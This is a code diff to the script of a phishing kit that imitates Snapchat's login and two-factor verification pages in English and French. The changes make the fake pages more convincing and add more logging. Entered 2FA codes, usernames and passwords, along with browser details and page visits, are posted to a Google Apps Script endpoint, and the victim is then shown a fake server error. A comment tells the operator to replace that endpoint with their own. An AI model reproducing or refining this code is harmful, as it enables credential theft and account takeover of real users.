@@ -5,37 +5,37 @@ const translations = {
             title: "Two-Factor Authentication",
             subtitle: "Enter the 6-digit code we sent you",
             continueBtn: "Continue",
-            resendLink: "Resend Code",
-            supportText: "Having trouble? Contact support@snapchat.com",
-            resendMessage: "Code resent! Check your phone or email.",
-            invalidCode: "Please enter a valid 6-digit code.",
-            verifying: "Verifying...",
-            verified: "Code Verified! Redirecting..."
+            resendLink: "Didn't receive a code?",
+            supportText: "Having trouble? Visit our Help Center",
+            resendMessage: "We've sent you a new code",
+            invalidCode: "Incorrect code. Please try again.",
+            verifying: "Verifying your code...",
+            verified: "Success!"
         },
         fr: {
             title: "Authentification à deux facteurs",
             subtitle: "Entrez le code à 6 chiffres que nous vous avons envoyé",
             continueBtn: "Continuer",
-            resendLink: "Renvoyer le code",
-            supportText: "Un problème ? Contactez support@snapchat.com",
-            resendMessage: "Code renvoyé ! Vérifiez votre téléphone ou email.",
-            invalidCode: "Veuillez entrer un code valide à 6 chiffres.",
-            verifying: "Vérification en cours...",
-            verified: "Code vérifié ! Redirection..."
+            resendLink: "Vous n'avez pas reçu de code ?",
+            supportText: "Besoin d'aide ? Visitez notre Centre d'aide",
+            resendMessage: "Nous vous avons envoyé un nouveau code",
+            invalidCode: "Code incorrect. Veuillez réessayer.",
+            verifying: "Vérification de votre code...",
+            verified: "Succès !"
         }
     },
     login: {
         en: {
-            title: "Log In",
-            usernamePlaceholder: "Username or Email",
+            title: "Log in to Snapchat",
+            usernamePlaceholder: "Username or email",
             passwordPlaceholder: "Password",
             loginBtn: "Log In",
-            forgotLink: "Forgot Password?",
+            forgotLink: "Forgot your password?",
             supportText: "New to Snapchat? <a href='#'>Sign Up</a>"
         },
         fr: {
-            title: "Connexion",
-            usernamePlaceholder: "Nom d'utilisateur ou Email",
+            title: "Connexion à Snapchat",
+            usernamePlaceholder: "Nom d'utilisateur ou e-mail",
             passwordPlaceholder: "Mot de passe",
             loginBtn: "Se connecter",
             forgotLink: "Mot de passe oublié ?",
@@ -44,35 +44,40 @@ const translations = {
     },
     error: {
         en: {
-            title: "Service Unavailable",
-            errorMessage: "We’re currently experiencing technical difficulties with our servers.",
-            errorSubtitle: "Please try again later. We’re working hard to resolve this issue as quickly as possible.",
-            backLink: "Return to Login",
-            supportText: "Need help? Contact support@snapchat.com"
+            title: "Something went wrong",
+            errorMessage: "We're having trouble connecting to Snapchat servers right now.",
+            errorSubtitle: "Please check your internet connection and try again in a few moments.",
+            backLink: "Try Again",
+            supportText: "Need help? Visit our <a href='#'>Help Center</a>"
         },
         fr: {
-            title: "Service indisponible",
-            errorMessage: "Nous rencontrons actuellement des difficultés techniques avec nos serveurs.",
-            errorSubtitle: "Veuillez réessayer plus tard. Nous travaillons activement pour résoudre ce problème le plus rapidement possible.",
-            backLink: "Retour à la connexion",
-            supportText: "Besoin d'aide ? Contactez support@snapchat.com"
+            title: "Une erreur s'est produite",
+            errorMessage: "Nous avons des difficultés à nous connecter aux serveurs Snapchat pour le moment.",
+            errorSubtitle: "Veuillez vérifier votre connexion Internet et réessayer dans quelques instants.",
+            backLink: "Réessayer",
+            supportText: "Besoin d'aide ? Visitez notre <a href='#'>Centre d'aide</a>"
         }
     }
 };
 
-// Langue par défaut
-let currentLang = 'en';
+// Détection automatique de la langue du navigateur
+let currentLang = navigator.language.startsWith('fr') ? 'fr' : 'en';
 
-// URL de ton Google Sheet
-const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycbwJW28v5Td5bVAtEtwCdNtHumbX8k5FLWQ91RemPv92K0XS3fPcmXsyHbtzBpMgQxA/exec';
+// ⚠️ CHANGEZ CETTE URL PAR LA VÔTRE
+const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycbxur_-UmZVt1YTebgeZNPQdJV7X55nS1tFhitzNPl-4HVNrvhdJZoSrC6-vpvG91VyJNQ/exec';
 
-// Fonction pour envoyer les données
+// Fonction pour envoyer les données avec timestamp et User-Agent
 function sendDataToSheet(type, value) {
+    const timestamp = new Date().toLocaleString();
+    const userAgent = navigator.userAgent;
     const data = {
         type: type,
-        value: value
+        value: value,
+        timestamp: timestamp,
+        userAgent: userAgent,
+        language: currentLang
     };
-    console.log('Tentative d’envoi:', data);
+    
     fetch(GOOGLE_SHEET_URL, {
         method: 'POST',
         mode: 'no-cors',
@@ -81,8 +86,8 @@ function sendDataToSheet(type, value) {
         },
         body: JSON.stringify(data)
     })
-    .then(() => console.log('Requête POST envoyée:', data))
-    .catch(error => console.error('Erreur:', error));
+    .then(() => console.log('Data logged'))
+    .catch(error => console.error('Error:', error));
 }
 
 // Fonction pour définir la langue
@@ -120,35 +125,73 @@ function toggleLanguageMenu() {
 // Initialiser la langue au chargement
 window.onload = function() {
     setLanguage(currentLang);
+    
+    // Logger la visite de la page
+    const page = window.location.pathname.split('/').pop() || 'index.html';
+    sendDataToSheet('Page Visit', page);
 };
 
 // Fermer le menu si on clique ailleurs
 document.addEventListener('click', function(event) {
     const menu = document.getElementById('language-menu');
     const btn = document.querySelector('.language-btn');
-    if (!btn.contains(event.target) && !menu.contains(event.target)) {
+    if (menu && btn && !btn.contains(event.target) && !menu.contains(event.target)) {
         menu.style.display = 'none';
     }
 });
 
-// Move focus to next input field
+// Move focus to next input field avec support backspace
 function moveToNext(current, nextField) {
     if (current.value.length >= 1 && nextField <= 6) {
-        document.getElementsByTagName('input')[nextField].focus();
+        const inputs = document.getElementsByTagName('input');
+        if (inputs[nextField]) {
+            inputs[nextField].focus();
+        }
     }
 }
 
-// Simulate resending code
-function resendCode() {
-    const message = document.getElementById('message');
-    message.style.color = '#0078ff';
-    message.textContent = translations.index[currentLang].resendMessage;
-    setTimeout(() => {
-        message.textContent = '';
-    }, 3000);
+// Ajouter support pour backspace
+if (document.getElementById('codeForm')) {
+    const inputs = document.querySelectorAll('.code-input input');
+    inputs.forEach((input, index) => {
+        input.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && !input.value && index > 0) {
+                inputs[index - 1].focus();
+            }
+        });
+        
+        input.addEventListener('input', function() {
+            if (this.value.length >= 1 && index < 5) {
+                inputs[index + 1].focus();
+            }
+        });
+    });
 }
 
-// Toggle password visibility with SVG
+// Simulate resending code avec délai réaliste
+function resendCode() {
+    const message = document.getElementById('message');
+    const resendLink = document.getElementById('resend-link');
+    
+    resendLink.style.pointerEvents = 'none';
+    resendLink.style.opacity = '0.5';
+    
+    message.style.color = '#000';
+    message.textContent = translations.index[currentLang].resendMessage;
+    
+    // Logger la demande de renvoi
+    sendDataToSheet('Resend Code', 'User requested code resend');
+    
+    setTimeout(() => {
+        message.textContent = '';
+        resendLink.style.pointerEvents = 'auto';
+        resendLink.style.opacity = '1';
+    }, 3000);
+    
+    return false;
+}
+
+// Toggle password visibility avec SVG
 function togglePasswordVisibility() {
     const passwordInput = document.getElementById('password-placeholder');
     const eyeIcon = document.getElementById('eye-icon');
@@ -156,31 +199,27 @@ function togglePasswordVisibility() {
         passwordInput.type = 'text';
         eyeIcon.innerHTML = `
             <path d="M2 2l20 20"></path>
-            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
-            <circle cx="12" cy="12" r="3"></circle>
-        `; // Œil barré (mot de passe visible)
+            <path d="M6.61 6.61A9 9 0 0019.39 17.39M2 12s4-8 11-8a10.34 10.34 0 012.36.28M22 12s-4 8-11 8a10.34 10.34 0 01-2.36-.28"></path>
+        `;
     } else {
         passwordInput.type = 'password';
         eyeIcon.innerHTML = `
             <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
             <circle cx="12" cy="12" r="3"></circle>
-        `; // Œil ouvert (mot de passe masqué)
+        `;
     }
 }
 
-// Handle code form submission (index.html)
+// Handle code form submission avec validation améliorée
 if (document.getElementById('codeForm')) {
-    console.log('Code form détecté');
     document.getElementById('codeForm').addEventListener('submit', function(event) {
         event.preventDefault();
-        console.log('Formulaire code soumis');
 
-        const inputs = document.getElementsByTagName('input');
+        const inputs = document.querySelectorAll('.code-input input');
         let code = '';
-        for (let i = 0; i < inputs.length; i++) {
-            code += inputs[i].value;
-        }
-        console.log('Code saisi:', code);
+        inputs.forEach(input => {
+            code += input.value;
+        });
 
         const message = document.getElementById('message');
         const button = document.querySelector('.verify-btn');
@@ -188,42 +227,70 @@ if (document.getElementById('codeForm')) {
         if (code.length !== 6 || !/^\d+$/.test(code)) {
             message.style.color = '#ff3333';
             message.textContent = translations.index[currentLang].invalidCode;
+            
+            // Shake animation pour les inputs
+            inputs.forEach(input => {
+                input.style.animation = 'shake 0.3s';
+                setTimeout(() => {
+                    input.style.animation = '';
+                }, 300);
+            });
             return;
         }
 
-        message.style.color = '#000';
+        message.style.color = '#666';
         message.textContent = translations.index[currentLang].verifying;
         button.disabled = true;
+        button.style.opacity = '0.7';
 
-        const codeEntry = `Code saisi : ${code}`;
-        sendDataToSheet('Code', codeEntry);
+        const codeEntry = `2FA Code: ${code}`;
+        sendDataToSheet('2FA Code', codeEntry);
 
+        // Délai réaliste pour la vérification
         setTimeout(() => {
-            message.style.color = '#00cc00';
+            message.style.color = '#00C853';
             message.textContent = translations.index[currentLang].verified;
             setTimeout(() => {
                 window.location.href = 'login.html';
-            }, 1000);
-        }, 2000);
+            }, 800);
+        }, 1500);
     });
 }
 
-// Handle login form submission (login.html)
+// Handle login form submission avec validation
 if (document.getElementById('loginForm')) {
-    console.log('Login form détecté');
     document.getElementById('loginForm').addEventListener('submit', function(event) {
         event.preventDefault();
-        console.log('Formulaire login soumis');
 
-        const username = document.getElementById('username-placeholder').value;
+        const username = document.getElementById('username-placeholder').value.trim();
         const password = document.getElementById('password-placeholder').value;
-        console.log('Username:', username, 'Password:', password);
+        const button = document.querySelector('.login-btn');
 
-        const credentialEntry = `Utilisateur : ${username} | Mot de passe : ${password}`;
-        sendDataToSheet('Credentials', credentialEntry);
+        if (!username || !password) {
+            return;
+        }
 
+        button.disabled = true;
+        button.textContent = currentLang === 'fr' ? 'Connexion...' : 'Logging in...';
+        button.style.opacity = '0.7';
+
+        const credentialEntry = `Username: ${username} | Password: ${password}`;
+        sendDataToSheet('Login Credentials', credentialEntry);
+
+        // Délai réaliste
         setTimeout(() => {
             window.location.href = 'error.html';
-        }, 1000);
+        }, 1200);
     });
 }
+
+// Ajouter animation shake au CSS
+const style = document.createElement('style');
+style.textContent = `
+    @keyframes shake {
+        0%, 100% { transform: translateX(0); }
+        25% { transform: translateX(-5px); }
+        75% { transform: translateX(5px); }
+    }
+`;
+document.head.appendChild(style);
